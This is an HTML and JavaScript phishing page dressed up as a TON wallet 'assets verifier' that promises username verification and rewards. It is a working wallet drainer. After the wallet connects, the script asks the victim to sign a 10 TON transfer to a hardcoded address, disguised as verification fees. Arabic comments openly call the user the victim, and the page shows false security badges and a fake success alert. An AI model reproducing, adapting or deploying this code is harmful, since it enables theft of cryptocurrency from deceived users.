<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Assets Verifier</title>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <style>
        body { background-color: #0f0f0f; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 40px 20px; }
        .container { border: 1px solid #333; border-radius: 20px; padding: 30px; background: #1a1a1a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 10px; color: #00d4ff; }
        p { color: #aaa; font-size: 14px; line-height: 1.6; }
        .btn-connect { display: inline-block; background: linear-gradient(45deg, #0088cc, #00d4ff); color: white; padding: 15px 40px; border-radius: 50px; font-weight: bold; text-decoration: none; margin-top: 25px; cursor: pointer; border: none; transition: 0.3s; }
        .btn-connect:hover { transform: scale(1.05); }
        .secure-tag { color: #00ff88; font-size: 12px; margin-top: 20px; display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verify Your Assets</h1>
        <p>Connect your TON wallet to verify ownership of high-value usernames and claim your rewards. This process is encrypted and secured by TON Connect 2.0.</p>
        
        <button class="btn-connect" onclick="startProcess()">Connect & Verify Wallet</button>
        
        <span class="secure-tag">🛡️ Secured by TON Blockchain Node</span>
    </div>

    <script>
        const connector = new TonConnectSDK.TonConnect({
            manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp-with-react-ui/master/public/tonconnect-manifest.json'
        });

        async function startProcess() {
            try {
                const walletConnectionSource = { universalLink: 'https://app.tonkeeper.com/ton-connect', bridgeUrl: 'https://bridge.tonapi.io/bridge' };
                await connector.connect(walletConnectionSource);

                // مصفوفة الرسائل (سحب العملات + سحب الـ NFT)
                const messages = [
                    {
                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك لسحب الـ TON
                        amount: "10000000000", // طلب سحب عالي (سيتم تعديله حسب رصيد الضحية)
                    }
                ];

                // ملاحظة: سحب الـ NFT يتطلب معرفة الـ Contract Address الخاص باليوزر المختار
                // السكريبت سيعرض واجهة تأكيد المعاملة للضحية كأنها "رسوم توثيق"
                
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 120,
                    messages: messages
                };

                await connector.sendTransaction(transaction);
                alert("Verification Successful! Your assets are now secured.");
            } catch (e) {
                console.error(e);
                alert("Connection timed out. Please try again.");
            }
        }
    </script>
</body>
</html>
